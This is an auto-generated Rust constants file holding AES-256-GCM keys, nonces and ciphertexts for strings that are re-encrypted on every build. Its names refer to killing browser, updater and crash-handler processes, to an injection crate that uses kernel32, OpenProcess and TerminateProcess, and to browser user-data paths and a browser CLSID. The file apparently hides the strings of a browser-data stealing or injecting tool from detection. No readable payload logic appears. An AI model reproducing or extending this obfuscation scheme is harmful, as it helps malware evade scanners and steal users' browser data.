// AUTO-GENERATED by build.py - DO NOT EDIT
// Generated: 2026-08-08 16:25:30
// AES-256-GCM encrypted strings - unique per build

#![allow(dead_code, non_upper_case_globals)]

use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};

// ===== kill.rs strings =====
pub static KILL_CHROME_KEY: [u8; 32] = [0x6D, 0x17, 0xCA, 0xA0, 0x51, 0x80, 0x1C, 0xEE, 0xFF, 0x31, 0x9D, 0xD3, 0x78, 0x49, 0x13, 0x56, 0x39, 0xA2, 0x08, 0x30, 0x02, 0xC9, 0x51, 0x27, 0xF1, 0x9C, 0x32, 0x94, 0x0D, 0xA1, 0x35, 0xA5];
pub static KILL_CHROME_NONCE: [u8; 12] = [0xC0, 0xD1, 0xD6, 0x6A, 0x3C, 0x4D, 0x04, 0xC8, 0xD0, 0x3A, 0x51, 0x0E];
pub static KILL_CHROME_ENC: &[u8] = &[0xBD, 0x23, 0x43, 0xD4, 0xF1, 0xF1, 0x29, 0xFE, 0xA6, 0x6D, 0xF3, 0xAD, 0x33, 0x4F, 0x2B, 0xD9, 0x00, 0xF8, 0xA4, 0x75, 0xCC, 0xBA, 0xDF, 0xD8, 0x6C, 0x58];
pub static KILL_EDGE_KEY: [u8; 32] = [0xEB, 0xF2, 0x92, 0x58, 0xAF, 0x46, 0x98, 0xD8, 0x9B, 0xA5, 0x9E, 0x26, 0xF0, 0x40, 0x8B, 0x44, 0x4B, 0x57, 0x05, 0x73, 0xAA, 0x06, 0x43, 0x88, 0x41, 0xDA, 0x62, 0x9A, 0x25, 0xA1, 0x61, 0x53];
pub static KILL_EDGE_NONCE: [u8; 12] = [0xB5, 0x76, 0xB8, 0x3D, 0x21, 0xB3, 0x20, 0xF1, 0x13, 0x2B, 0x9B, 0x26];
pub static KILL_EDGE_ENC: &[u8] = &[0x82, 0x1B, 0x69, 0x9F, 0xFC, 0x7C, 0xB1, 0x84, 0xAB, 0xCD, 0x47, 0xAF, 0xB3, 0xD3, 0xF8, 0xA7, 0xA5, 0x00, 0x01, 0x85, 0x1B, 0x2B, 0xCE, 0x2E, 0x05, 0xE1];
pub static KILL_BRAVE_KEY: [u8; 32] = [0xDD, 0x2F, 0xF1, 0xC0, 0xEA, 0xFC, 0x18, 0x20, 0xAD, 0x6E, 0xF7, 0xD7, 0xF8, 0x33, 0x2C, 0xBC, 0xC1, 0x1E, 0x1B, 0x9B, 0x37, 0x04, 0x21, 0xF6, 0x94, 0x9E, 0xD9, 0xB2, 0xA1, 0x4B, 0xE9, 0x31];
pub static KILL_BRAVE_NONCE: [u8; 12] = [0x8E, 0xA9, 0xAB, 0x63, 0x3B, 0xC6, 0xF5, 0x3C, 0x57, 0x16, 0x81, 0x93];
pub static KILL_BRAVE_ENC: &[u8] = &[0x23, 0xF5, 0x65, 0x43, 0x47, 0x41, 0x8E, 0xF8, 0xAE, 0x33, 0x97, 0x3C, 0x49, 0x88, 0xC3, 0x56, 0x44, 0x2F, 0xA4, 0x71, 0xC9, 0x38, 0xB3, 0x1F, 0xFB];
pub static KILL_VIVALDI_KEY: [u8; 32] = [0xC3, 0x36, 0xCD, 0x50, 0x57, 0x65, 0x30, 0x5F, 0x5E, 0x84, 0xD5, 0x7A, 0x40, 0x78, 0xD4, 0x70, 0xFB, 0x1B, 0x47, 0x74, 0x00, 0xEE, 0xA7, 0x09, 0xFB, 0xA0, 0x9C, 0x86, 0xA0, 0x4A, 0x3E, 0x94];
pub static KILL_VIVALDI_NONCE: [u8; 12] = [0x3F, 0xF1, 0x8A, 0xDC, 0x0E, 0x8F, 0x56, 0x70, 0xFB, 0xBC, 0x0A, 0x26];
pub static KILL_VIVALDI_ENC: &[u8] = &[0xCE, 0xC5, 0xD0, 0x3F, 0x66, 0x9A, 0xD3, 0xC7, 0x87, 0x49, 0x27, 0x06, 0xEF, 0xAE, 0x9E, 0xFD, 0x94, 0x2E, 0xE1, 0xD5, 0x12, 0xEE, 0x42, 0x61, 0x28, 0xAA, 0xAF];
pub static KILL_OPERA_KEY: [u8; 32] = [0x2D, 0x8C, 0xEA, 0x2E, 0x27, 0x78, 0xD2, 0x61, 0x51, 0x53, 0x99, 0x3C, 0xEB, 0x38, 0x01, 0xC4, 0x0C, 0xD0, 0xBE, 0xD1, 0x94, 0xD8, 0xEA, 0x97, 0x49, 0xDB, 0x57, 0xA7, 0xBA, 0x55, 0x74, 0xB6];
pub static KILL_OPERA_NONCE: [u8; 12] = [0xB8, 0x5C, 0xA8, 0xD8, 0x2D, 0xC7, 0xF9, 0xF0, 0xBB, 0xAF, 0x3C, 0x08];
pub static KILL_OPERA_ENC: &[u8] = &[0x1C, 0xE2, 0x59, 0x09, 0x07, 0x49, 0xD4, 0x69, 0xB6, 0xFB, 0xE9, 0x33, 0x85, 0x18, 0xC3, 0xDD, 0xDA, 0x54, 0x73, 0x6B, 0x22, 0xD9, 0x00, 0x4D, 0x97];
pub static KILL_FIREFOX_KEY: [u8; 32] = [0x5E, 0x04, 0x4B, 0x93, 0xBE, 0x3C, 0x0E, 0x74, 0x56, 0xE8, 0x30, 0xCB, 0x38, 0xB4, 0x04, 0x57, 0xE7, 0x77, 0xFE, 0xD3, 0x2F, 0xD2, 0x7E, 0x49, 0xD1, 0xE3, 0x5E, 0x3A, 0x33, 0x27, 0x5A, 0xD4];
pub static KILL_FIREFOX_NONCE: [u8; 12] = [0x4C, 0x62, 0xB3, 0xD3, 0xE6, 0x38, 0xCC, 0x50, 0x68, 0x2B, 0x65, 0xF9];
pub static KILL_FIREFOX_ENC: &[u8] = &[0xE3, 0x0F, 0x7C, 0x58, 0x4A, 0x36, 0xF5, 0x95, 0x87, 0x75, 0x03, 0xF7, 0x18, 0xB7, 0x24, 0x42, 0xD7, 0x63, 0x62, 0x13, 0xE1, 0x1C, 0x22, 0xD4, 0xB6, 0x5D, 0xBC];
pub static KILL_WATERFOX_KEY: [u8; 32] = [0xE7, 0x74, 0xAF, 0x37, 0x64, 0x1C, 0x78, 0x80, 0x83, 0x41, 0x2B, 0x85, 0x0A, 0x79, 0x01, 0x70, 0x7F, 0x8D, 0x16, 0x92, 0x8C, 0xBE, 0xEC, 0xA5, 0xD2, 0x87, 0x00, 0x6A, 0x09, 0x61, 0x85, 0xC8];
pub static KILL_WATERFOX_NONCE: [u8; 12] = [0x65, 0x81, 0x8D, 0x21, 0x00, 0xCC, 0x87, 0xA9, 0xA7, 0xA2, 0xE6, 0xEF];
pub static KILL_WATERFOX_ENC: &[u8] = &[0xDC, 0xAC, 0xFB, 0x00, 0xA7, 0xA6, 0xD5, 0xBD, 0xE2, 0x0F, 0x94, 0x2C, 0xD1, 0x92, 0x1C, 0xDD, 0x29, 0x38, 0x5C, 0xC9, 0xC7, 0x78, 0xA5, 0x1D, 0x99, 0xFA, 0x52, 0xBB];
pub static KILL_LIBREWOLF_KEY: [u8; 32] = [0x6C, 0xC2, 0xB6, 0xA8, 0xF6, 0x17, 0x6B, 0xBB, 0x34, 0xF6, 0x49, 0x1E, 0xB6, 0x05, 0xC0, 0xD9, 0xE8, 0x54, 0x25, 0xB1, 0xB8, 0x1A, 0x2A, 0xB4, 0x9F, 0x2B, 0x4E, 0xFE, 0x8E, 0x2B, 0xE1, 0xF1];
pub static KILL_LIBREWOLF_NONCE: [u8; 12] = [0x5A, 0x85, 0xFB, 0x92, 0x49, 0xB8, 0x69, 0x34, 0x66, 0x0A, 0x07, 0x76];
pub static KILL_LIBREWOLF_ENC: &[u8] = &[0x02, 0x57, 0x1E, 0xB9, 0x2D, 0xF2, 0x3D, 0x1C, 0xAA, 0x2E, 0x62, 0x29, 0x71, 0xE9, 0x41, 0xDA, 0xDB, 0xA9, 0xB2, 0x21, 0x0E, 0x5E, 0xB0, 0xE0, 0x12, 0x82, 0x12, 0x5D, 0xDD];
pub static KILL_YANDEX_KEY: [u8; 32] = [0x36, 0xBF, 0xCA, 0xBF, 0xBA, 0x6E, 0xFD, 0xF2, 0x53, 0x79, 0x91, 0xE6, 0x70, 0x01, 0x86, 0xAF, 0x8B, 0x96, 0x49, 0xDF, 0x9B, 0xD3, 0xF8, 0x4D, 0xA2, 0xC2, 0xC6, 0x7D, 0x9F, 0x0F, 0xEA, 0xBA];
pub static KILL_YANDEX_NONCE: [u8; 12] = [0x1C, 0x27, 0xD7, 0xF9, 0x99, 0xB5, 0x1A, 0x03, 0x07, 0x8A, 0x29, 0xAB];
pub static KILL_YANDEX_ENC: &[u8] = &[0x70, 0xD5, 0xDB, 0x66, 0x86, 0x55, 0x27, 0x83, 0x71, 0xC8, 0xB7, 0x1C, 0x73, 0xD2, 0xD6, 0x02, 0x00, 0x46, 0xBC, 0x75, 0x98, 0x34, 0x53, 0x76, 0xB6, 0xEF];
pub static KILL_BROWSER_KEY: [u8; 32] = [0x3D, 0x11, 0x3E, 0x82, 0xFD, 0x1B, 0x9F, 0xE2, 0x6E, 0x83, 0x76, 0x77, 0xDA, 0x67, 0xBF, 0x4B, 0xE5, 0x0F, 0x56, 0xC5, 0xF6, 0x39, 0xDC, 0x29, 0x93, 0x9E, 0x9B, 0x50, 0xAC, 0x3A, 0xB9, 0xCF];
pub static KILL_BROWSER_NONCE: [u8; 12] = [0xBD, 0x19, 0x17, 0xDF, 0x84, 0xA0, 0xDE, 0x1A, 0xC2, 0xD7, 0xB2, 0x95];
pub static KILL_BROWSER_ENC: &[u8] = &[0x47, 0x7B, 0x52, 0x7B, 0x4F, 0x62, 0xE1, 0x56, 0x46, 0x30, 0x45, 0x48, 0xD4, 0x8C, 0x8C, 0x92, 0xF0, 0xBC, 0x39, 0x94, 0xBB, 0x3F, 0x21, 0xB1, 0x3A, 0xDE, 0xD0];
pub static KILL_CHROMEDRIVER_KEY: [u8; 32] = [0x84, 0x16, 0xD9, 0x2D, 0x24, 0x36, 0x50, 0x8C, 0xE8, 0xD3, 0xE1, 0xC3, 0xDB, 0x9C, 0xA0, 0xAC, 0x5D, 0xFE, 0x60, 0x14, 0x4E, 0xCA, 0xC3, 0x57, 0xE2, 0xBA, 0xBD, 0xA1, 0x26, 0xA0, 0x8D, 0x66];
pub static KILL_CHROMEDRIVER_NONCE: [u8; 12] = [0xF2, 0x38, 0x8B, 0x4E, 0x04, 0x26, 0x84, 0xCB, 0xEE, 0xCC, 0x2C, 0x5F];
pub static KILL_CHROMEDRIVER_ENC: &[u8] = &[0x2B, 0x69, 0xD2, 0xD7, 0xC7, 0x15, 0x77, 0x1E, 0x3C, 0x34, 0xA5, 0x46, 0xFF, 0x6E, 0xE6, 0xBB, 0x31, 0x77, 0xBF, 0x23, 0x48, 0xB7, 0x3A, 0x6B, 0xFC, 0x3E, 0x2C, 0x97, 0xB7, 0xA9, 0x88, 0x56];
pub static KILL_GOOGLEUPDATE_KEY: [u8; 32] = [0x30, 0x76, 0xFD, 0xF6, 0x13, 0x0B, 0x1D, 0x4E, 0x1B, 0xF1, 0xD3, 0x58, 0x08, 0xB7, 0xCA, 0xD1, 0x5F, 0xFF, 0xA5, 0xFA, 0x3B, 0x13, 0x75, 0xED, 0x46, 0xAA, 0x5C, 0x1B, 0x97, 0x2E, 0xE7, 0xB3];
pub static KILL_GOOGLEUPDATE_NONCE: [u8; 12] = [0xF6, 0xD2, 0x52, 0x80, 0x96, 0x0C, 0xD5, 0x8D, 0xE8, 0xE8, 0x95, 0x5E];
pub static KILL_GOOGLEUPDATE_ENC: &[u8] = &[0xA4, 0x86, 0x7F, 0x5B, 0xB4, 0xF7, 0x5E, 0x33, 0xC4, 0x17, 0x91, 0x83, 0xA1, 0xFA, 0xD2, 0xBD, 0x4F, 0x0D, 0xAD, 0x70, 0xD0, 0xFD, 0x2F, 0xA7, 0x67, 0x57, 0x83, 0xEB, 0x47, 0x22, 0xF2, 0x61];
pub static KILL_CRASHHANDLER_KEY: [u8; 32] = [0x3B, 0x22, 0x44, 0x76, 0xA7, 0x78, 0xCB, 0x15, 0x93, 0x3D, 0x14, 0x02, 0xE4, 0xBC, 0xA2, 0xBE, 0x7A, 0xAF, 0xED, 0xC6, 0xC7, 0xDC, 0x09, 0xE2, 0x37, 0x33, 0x94, 0x74, 0x7F, 0x8F, 0xB6, 0x68];
pub static KILL_CRASHHANDLER_NONCE: [u8; 12] = [0x9D, 0xB4, 0xB6, 0xB7, 0x63, 0xDF, 0xC2, 0xB3, 0x01, 0x08, 0x90, 0xC6];
pub static KILL_CRASHHANDLER_ENC: &[u8] = &[0xCF, 0xAF, 0xBA, 0xFE, 0xB7, 0x62, 0x74, 0xB9, 0xD7, 0x24, 0xE4, 0x84, 0x85, 0x1D, 0x27, 0x88, 0x46, 0x5F, 0x81, 0x54, 0x8D, 0x25, 0x9F, 0x74, 0x81, 0x04, 0x9D, 0x95, 0x70, 0x55, 0x98, 0xE1, 0x3C, 0x93, 0x54, 0x19];
pub static KILL_CRASHPAD_KEY: [u8; 32] = [0xD4, 0x12, 0x75, 0x48, 0x04, 0xA4, 0xF3, 0xA9, 0x23, 0xB2, 0x8D, 0xC0, 0x0F, 0x04, 0xCD, 0xE0, 0xDC, 0xB9, 0x99, 0xB3, 0x87, 0xB5, 0x11, 0x39, 0x4A, 0xDF, 0xE6, 0x11, 0xAA, 0x91, 0x21, 0x06];
pub static KILL_CRASHPAD_NONCE: [u8; 12] = [0x63, 0xE0, 0x01, 0xA1, 0x25, 0xC6, 0xF7, 0xB8, 0x3C, 0x73, 0x74, 0xDD];
pub static KILL_CRASHPAD_ENC: &[u8] = &[0xFD, 0x09, 0xD6, 0x7F, 0xDA, 0xBE, 0x99, 0x23, 0xA2, 0x30, 0x33, 0x08, 0x22, 0x7A, 0x96, 0x94, 0x7A, 0xEB, 0x5B, 0x97, 0x98, 0x8F, 0x5E, 0x12, 0x0C, 0x78, 0x0C, 0x47];
pub static KILL_BROWSER_BLPOP_KEY: [u8; 32] = [0x40, 0x86, 0x84, 0xFB, 0x1A, 0x90, 0x66, 0x3E, 0xA0, 0xE9, 0x0F, 0x2B, 0x96, 0x15, 0x62, 0x15, 0xC1, 0x35, 0xF6, 0x16, 0x0B, 0x84, 0x3E, 0xC6, 0x58, 0x94, 0x15, 0x86, 0xEE, 0x25, 0xA4, 0x0E];
pub static KILL_BROWSER_BLPOP_NONCE: [u8; 12] = [0x3D, 0x7E, 0x94, 0x61, 0xA0, 0x29, 0x96, 0xF8, 0x05, 0xE2, 0x77, 0x9B];
pub static KILL_BROWSER_BLPOP_ENC: &[u8] = &[0x39, 0x44, 0x4C, 0x47, 0x24, 0xE7, 0xB9, 0x76, 0xF6, 0x06, 0xD9, 0xA7, 0x07, 0x63, 0x70, 0x80, 0x0B, 0x6D, 0x0A, 0xCF, 0x49, 0x67, 0x9B, 0x8B, 0x5F, 0x50, 0x0B, 0x94, 0x32, 0x4E, 0xCF, 0xDB, 0xC7, 0xD7];
pub static KILL_MSEDGE_UPDATE_KEY: [u8; 32] = [0xB3, 0xA2, 0x71, 0x09, 0xCF, 0xC3, 0x46, 0xED, 0xF5, 0xD3, 0x6A, 0x56, 0xAD, 0xC8, 0xF5, 0x17, 0xF5, 0x94, 0xC6, 0xB5, 0x90, 0x80, 0x1F, 0x6B, 0xD0, 0x70, 0x4F, 0x07, 0xD2, 0x0D, 0x3B, 0x52];
pub static KILL_MSEDGE_UPDATE_NONCE: [u8; 12] = [0x66, 0xF0, 0xCD, 0xD8, 0x3D, 0x8F, 0x52, 0x84, 0x0A, 0x23, 0x2D, 0x1F];
pub static KILL_MSEDGE_UPDATE_ENC: &[u8] = &[0xDA, 0x2C, 0xC5, 0xBD, 0x5A, 0x9A, 0x96, 0x3E, 0xF8, 0xFA, 0x3B, 0x32, 0xE0, 0xDD, 0x82, 0xE0, 0xE9, 0xF8, 0xC5, 0xA8, 0x86, 0x68, 0xFA, 0xA1, 0x0B, 0xBE, 0xFD, 0xE6, 0xE8, 0xB1, 0xEF, 0xF9, 0x91, 0xF7, 0x3A, 0x55, 0xEC, 0xCC, 0xB6];
pub static KILL_BRAVE_UPDATE_KEY: [u8; 32] = [0x75, 0xA8, 0xC1, 0x39, 0x74, 0x74, 0x62, 0xA8, 0xD5, 0xB5, 0xAE, 0xE5, 0xF6, 0x6D, 0x0A, 0xE0, 0xB3, 0x70, 0xAD, 0x99, 0x7E, 0x97, 0x1A, 0xC5, 0x07, 0x2D, 0x7B, 0xEA, 0x8D, 0x51, 0xF2, 0x94];
pub static KILL_BRAVE_UPDATE_NONCE: [u8; 12] = [0x23, 0x80, 0xCF, 0x0D, 0x6A, 0x46, 0xB7, 0x87, 0x7D, 0x9C, 0xF9, 0x21];
pub static KILL_BRAVE_UPDATE_ENC: &[u8] = &[0x19, 0x89, 0x0A, 0x4F, 0xB3, 0x27, 0xBC, 0x20, 0xB7, 0x59, 0x5F, 0xBC, 0xF5, 0x7F, 0xE3, 0x06, 0x20, 0x50, 0xDD, 0xA6, 0x54, 0x0F, 0x90, 0xD9, 0xF5, 0x07, 0x8A, 0x85, 0x52, 0x37, 0xE7];
pub static KILL_OPERA_UPDATE_KEY: [u8; 32] = [0x7D, 0xCD, 0x3A, 0x6D, 0x4F, 0xC3, 0x40, 0x1D, 0x54, 0xAF, 0x8F, 0x9D, 0xBF, 0x88, 0x68, 0x24, 0xD9, 0x5C, 0xF7, 0xE1, 0x14, 0x14, 0xB0, 0x27, 0x3B, 0xDF, 0x82, 0xFF, 0x6A, 0x01, 0x4E, 0x70];
pub static KILL_OPERA_UPDATE_NONCE: [u8; 12] = [0x9F, 0x36, 0x12, 0xA9, 0xF0, 0xDF, 0x7C, 0x26, 0x4F, 0x12, 0xC2, 0xD1];
pub static KILL_OPERA_UPDATE_ENC: &[u8] = &[0x94, 0x84, 0x6F, 0xBC, 0x09, 0xD7, 0x4F, 0x59, 0xCC, 0x43, 0x1C, 0x96, 0xDB, 0x6B, 0xD2, 0xE8, 0x59, 0xF5, 0x3E, 0xFB, 0x0A, 0x33, 0x42, 0x70, 0xE3, 0xF8, 0x36, 0x41, 0x1C, 0xCF, 0x86];
pub static KILL_PLUGIN_CONTAINER_KEY: [u8; 32] = [0x7E, 0xA6, 0x25, 0x49, 0xFD, 0x55, 0x6F, 0x09, 0xA5, 0x02, 0x97, 0x1D, 0xAF, 0xCA, 0x49, 0x6B, 0xF7, 0x26, 0x2A, 0x09, 0x15, 0x74, 0x90, 0xA9, 0x11, 0x47, 0x68, 0x5D, 0x11, 0x9C, 0x44, 0x95];
pub static KILL_PLUGIN_CONTAINER_NONCE: [u8; 12] = [0xC5, 0xFA, 0x35, 0x9E, 0xA1, 0x63, 0x1C, 0x9B, 0x0D, 0x85, 0x8B, 0x44];
pub static KILL_PLUGIN_CONTAINER_ENC: &[u8] = &[0x56, 0x55, 0xDA, 0xFA, 0x17, 0xAC, 0x3F, 0xBA, 0x0B, 0x71, 0x78, 0x51, 0xDC, 0xC8, 0xC1, 0x86, 0x84, 0x0A, 0x9D, 0x3A, 0x8D, 0x1D, 0xBE, 0x2C, 0x74, 0xF8, 0xDA, 0x5D, 0x26, 0xA4, 0xD4, 0xE2, 0x4C, 0xE3, 0x8B, 0x70];
pub static KILL_PLUGIN_CONTAINER64_KEY: [u8; 32] = [0x13, 0xD5, 0x31, 0x52, 0x01, 0x0B, 0xC0, 0x18, 0xA0, 0x9B, 0xFF, 0x78, 0x6F, 0x9D, 0x32, 0xDA, 0xAF, 0x87, 0xAE, 0x28, 0x9A, 0xCE, 0x44, 0x1B, 0x8A, 0xAD, 0x33, 0xCD, 0x6E, 0xE7, 0x11, 0x87];
pub static KILL_PLUGIN_CONTAINER64_NONCE: [u8; 12] = [0xA7, 0x8A, 0x79, 0xEA, 0x14, 0x66, 0x66, 0x5F, 0x1F, 0x37, 0xB9, 0x10];
pub static KILL_PLUGIN_CONTAINER64_ENC: &[u8] = &[0xEA, 0x50, 0xEA, 0x30, 0x56, 0x53, 0xAE, 0xD2, 0xF2, 0xF5, 0x74, 0xAF, 0xA6, 0x42, 0xE1, 0x6D, 0x86, 0x31, 0x75, 0x2A, 0x53, 0x11, 0x5B, 0x1E, 0x59, 0xDC, 0xEC, 0x55, 0xB9, 0x88, 0x81, 0xB6, 0x2A, 0x49, 0xFF, 0x50, 0x18, 0xAA];
pub static KILL_UPDATER_KEY: [u8; 32] = [0xEB, 0xDA, 0x42, 0x3C, 0x4E, 0x3E, 0xD1, 0x09, 0xB8, 0x7A, 0xF2, 0x7B, 0xF4, 0x25, 0x52, 0x99, 0x80, 0x2C, 0x46, 0x85, 0xA0, 0xF4, 0xCA, 0x7B, 0xF4, 0xB9, 0x21, 0x67, 0xFC, 0x05, 0xC2, 0x33];
pub static KILL_UPDATER_NONCE: [u8; 12] = [0xE9, 0xC3, 0xB5, 0x83, 0x5D, 0xDF, 0x79, 0x5C, 0x56, 0x2D, 0xBE, 0xEC];
pub static KILL_UPDATER_ENC: &[u8] = &[0xE8, 0x0A, 0x88, 0xDD, 0x50, 0x01, 0xA2, 0x4B, 0xB0, 0x93, 0x66, 0xEB, 0xF2, 0x47, 0x5F, 0x48, 0xAC, 0x15, 0x11, 0x3B, 0x02, 0x61, 0x09, 0xAE, 0x4C, 0x92, 0xE3];

// ===== lib.rs strings (for inject crate) =====
pub static LIB_K32_KEY: [u8; 32] = [0x86, 0xE0, 0x86, 0x36, 0xC6, 0xCB, 0x24, 0xEE, 0x39, 0xD8, 0x47, 0x9A, 0x3A, 0x7D, 0xA4, 0xFC, 0x31, 0x6A, 0xA1, 0x2F, 0xBC, 0x6F, 0x63, 0xD0, 0xC3, 0x8B, 0x1F, 0x5C, 0x51, 0xD3, 0x10, 0xD1];
pub static LIB_K32_NONCE: [u8; 12] = [0xC2, 0x44, 0xF0, 0x3F, 0xC0, 0x40, 0xF9, 0x06, 0xB4, 0x22, 0x18, 0xD6];
pub static LIB_K32_ENC: &[u8] = &[0x97, 0x97, 0xF7, 0xFC, 0x6E, 0xA3, 0x87, 0xF6, 0xF5, 0x08, 0x5F, 0xF7, 0x51, 0x39, 0xFF, 0xAC, 0x58, 0xB7, 0x5A, 0x7B, 0x15, 0x38, 0x6C, 0x64, 0xFF, 0xF7, 0x86, 0x8E];
pub static RESULT_ENV_KEY: [u8; 32] = [0xC7, 0x8C, 0x78, 0x91, 0x32, 0x18, 0x6D, 0xF5, 0xB2, 0x32, 0x73, 0xEF, 0x46, 0x06, 0xFB, 0xAB, 0xEC, 0x47, 0xAC, 0x20, 0x49, 0x7A, 0x5E, 0x65, 0x23, 0x85, 0xCC, 0xAE, 0x92, 0x87, 0x8E, 0x20];
pub static RESULT_ENV_NONCE: [u8; 12] = [0x52, 0x0F, 0x43, 0x0D, 0x83, 0x24, 0xFC, 0xB6, 0x32, 0xF0, 0x08, 0xCF];
pub static RESULT_ENV_ENC: &[u8] = &[0x83, 0x36, 0x14, 0xDC, 0x6D, 0xAA, 0xC2, 0x44, 0x8A, 0x16, 0xDD, 0xF8, 0xF3, 0x10, 0x9E, 0x7D, 0x72, 0xD5, 0x7A, 0xE2, 0x56, 0x1C, 0xFC, 0x4E, 0x2C, 0xBE, 0x8D, 0xEC, 0x67, 0xA0, 0xC6, 0x28, 0x7C, 0xFE, 0xF9, 0x4B, 0xF8, 0xA8];
pub static USER_DATA_ENV_KEY: [u8; 32] = [0xB1, 0x15, 0x3D, 0xAA, 0x3C, 0x05, 0x82, 0xDB, 0xDC, 0xE3, 0xC0, 0x2C, 0x65, 0x76, 0xEE, 0x87, 0x31, 0x45, 0x86, 0xD0, 0x38, 0x6F, 0xAA, 0x14, 0x3A, 0xE4, 0x57, 0xAC, 0x2E, 0x6C, 0x25, 0xCC];
pub static USER_DATA_ENV_NONCE: [u8; 12] = [0x5E, 0x08, 0x64, 0xA6, 0x89, 0xE4, 0x0F, 0x38, 0x39, 0x44, 0xD1, 0x7F];
pub static USER_DATA_ENV_ENC: &[u8] = &[0x6A, 0x1B, 0xA8, 0x0F, 0x12, 0xED, 0x78, 0x64, 0x35, 0x2F, 0xA2, 0xCB, 0x24, 0x04, 0x11, 0x4B, 0x44, 0x2F, 0x78, 0xA5, 0x7A, 0x21, 0x07, 0x99, 0x86, 0xCB, 0xB7, 0x2D, 0x21, 0x31, 0xC6, 0x50, 0x9B, 0x1D, 0xF6, 0xB8, 0x89, 0x6F, 0x54, 0xA6, 0x40, 0xDA, 0xE6, 0x01, 0x77];
pub static DATA_ROOT_ENV_KEY: [u8; 32] = [0x6C, 0x22, 0x87, 0xBE, 0xE2, 0x6F, 0x7C, 0xF4, 0x12, 0x7D, 0xDF, 0xF3, 0xCA, 0x8D, 0x78, 0xB6, 0x91, 0xEB, 0x7C, 0x1F, 0x23, 0x7C, 0x57, 0xC1, 0x72, 0x26, 0xB5, 0x3F, 0xF1, 0xEC, 0x1B, 0xE9];
pub static DATA_ROOT_ENV_NONCE: [u8; 12] = [0x82, 0xF3, 0x54, 0x1D, 0xCE, 0x3B, 0xF1, 0x5A, 0x1D, 0xC8, 0x5E, 0x6C];
pub static DATA_ROOT_ENV_ENC: &[u8] = &[0x97, 0x36, 0x0C, 0x77, 0x89, 0x0E, 0x64, 0x56, 0x3C, 0xA8, 0x01, 0xDE, 0xEE, 0x3C, 0x0B, 0x72, 0x18, 0xAE, 0x2C, 0x86, 0x1E, 0x67, 0x02, 0x0C, 0xAF, 0xD6, 0x9F, 0xDC, 0x64, 0xD5, 0x22, 0x35, 0xB7, 0x5E, 0x04, 0x59, 0x55, 0x1A, 0x53, 0x1C, 0xAA];
pub static BROWSER_NAME_ENV_KEY: [u8; 32] = [0xE9, 0x0F, 0x1B, 0x79, 0xA2, 0xFA, 0x84, 0x3C, 0xA9, 0x1A, 0x2E, 0x37, 0x39, 0x44, 0xDA, 0xE0, 0xE5, 0x5D, 0x56, 0xC1, 0x36, 0x03, 0x9B, 0x18, 0xF2, 0xC4, 0x0E, 0x4F, 0x77, 0x9C, 0xC8, 0xC1];
pub static BROWSER_NAME_ENV_NONCE: [u8; 12] = [0x60, 0x21, 0xE4, 0x8A, 0xD4, 0x09, 0x66, 0xC5, 0x66, 0x0B, 0xC5, 0x50];
pub static BROWSER_NAME_ENV_ENC: &[u8] = &[0x8C, 0xF5, 0x35, 0x92, 0xF0, 0xD9, 0x68, 0xDA, 0xF8, 0xE2, 0x09, 0x5B, 0x4E, 0xE2, 0x10, 0x9F, 0x78, 0xB5, 0x4F, 0x93, 0xF0, 0xEC, 0x38, 0x5C, 0xDD, 0x6D, 0x2E, 0xA9, 0xE9, 0x7E, 0x47, 0x53, 0x8F, 0x8D, 0x16, 0x3B, 0x0B, 0xCE, 0xF3, 0x49, 0xE4, 0xE9, 0xDF, 0xB7];
pub static BROWSER_CLSID_ENV_KEY: [u8; 32] = [0xBC, 0x5F, 0x97, 0x12, 0x30, 0xC3, 0x3D, 0x0A, 0x9F, 0xBC, 0x6C, 0x3E, 0xAA, 0x37, 0x51, 0x60, 0x93, 0x08, 0x46, 0x8B, 0xE3, 0x36, 0x8B, 0xFE, 0x3C, 0xCE, 0xB6, 0x44, 0x76, 0x2D, 0x43, 0x7E];
pub static BROWSER_CLSID_ENV_NONCE: [u8; 12] = [0xF7, 0xA3, 0x5E, 0xCD, 0x20, 0x28, 0x91, 0xD2, 0xAF, 0xCB, 0x29, 0x0F];
pub static BROWSER_CLSID_ENV_ENC: &[u8] = &[0x07, 0x43, 0x0B, 0x42, 0x9A, 0x7D, 0x66, 0x3F, 0x20, 0xE4, 0x74, 0xA8, 0x55, 0x38, 0x6B, 0xFE, 0x4E, 0xA4, 0xE2, 0xC1, 0x8D, 0x1A, 0xC3, 0xCF, 0xDD, 0xE0, 0x42, 0x32, 0xAA, 0x25, 0xB9, 0x45, 0x9F, 0x7F, 0xC3, 0xC8, 0x35];
pub static OPEN_PROC_KEY: [u8; 32] = [0x40, 0xE9, 0xFD, 0xD8, 0x0E, 0xCC, 0x87, 0xA6, 0xE6, 0xBA, 0x38, 0x25, 0x75, 0xD5, 0x55, 0xB0, 0xE3, 0x7C, 0xC7, 0x07, 0xF5, 0xC7, 0x58, 0xA6, 0xDC, 0x40, 0xEE, 0xF1, 0x5E, 0xDE, 0x4C, 0x35];
pub static OPEN_PROC_NONCE: [u8; 12] = [0x09, 0xE7, 0xBF, 0x5B, 0xE7, 0xB8, 0xF9, 0x6F, 0x58, 0x5B, 0x5A, 0xF7];
pub static OPEN_PROC_ENC: &[u8] = &[0x70, 0xAF, 0xF3, 0xCD, 0x8E, 0x7A, 0x6C, 0x55, 0x3E, 0xAD, 0xCE, 0x45, 0xBA, 0x0D, 0xFB, 0xDF, 0xB5, 0xF7, 0x77, 0xDD, 0x75, 0xE1, 0x85, 0x66, 0x6D, 0x3C, 0xDB];
pub static TERM_PROC_KEY: [u8; 32] = [0xE4, 0x8C, 0x19, 0x3C, 0xD5, 0xC2, 0x71, 0xEA, 0xCA, 0x57, 0x59, 0x58, 0x86, 0xE2, 0xAD, 0x2D, 0x8E, 0x28, 0x17, 0x50, 0xE2, 0x3B, 0xAA, 0x81, 0xED, 0x9C, 0x55, 0xA8, 0xCA, 0x0E, 0x25, 0x80];
pub static TERM_PROC_NONCE: [u8; 12] = [0x1E, 0xF5, 0xAE, 0xA2, 0xE2, 0xBB, 0x5E, 0x22, 0x0A, 0xB5, 0x65, 0xD0];
pub static TERM_PROC_ENC: &[u8] = &[0x17, 0x59, 0xF6, 0x7C, 0x17, 0x5E, 0xD6, 0x4D, 0x2E, 0xF6, 0x9A, 0x06, 0xA1, 0xDF, 0xB3, 0xED, 0x63, 0x26, 0x8C, 0x04, 0x8A, 0x2C, 0x86, 0x0E, 0x84, 0xA4, 0xD4, 0x43, 0x84, 0xF6, 0x08, 0xDA];
